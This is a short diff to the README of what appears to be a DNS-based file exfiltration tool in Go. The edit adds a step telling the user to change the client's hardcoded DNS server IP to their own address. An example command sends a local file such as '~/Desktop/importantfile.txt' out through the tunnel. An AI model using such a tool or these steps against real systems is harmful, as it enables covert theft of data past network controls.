@@ -4,7 +4,7 @@ How it Works:
 1. build the server and start it (sudo ./<binname>)
 2. The dns server will then listen for incoming DNS connections
 3. The dns server will resolve any request it gets to 10.10.10.10
-4. build and run the client and feed it a single parameter which is the path to the file you want to exfil. Example:
+4. Change the dns server IP in the client code from 127.0.0.1 to whatever IP you are using and then build and run the client and feed it a single parameter which is the path to the file you want to exfil. Example:
 
 ./go-dnsclient ~/Desktop/importantfile.txt
 
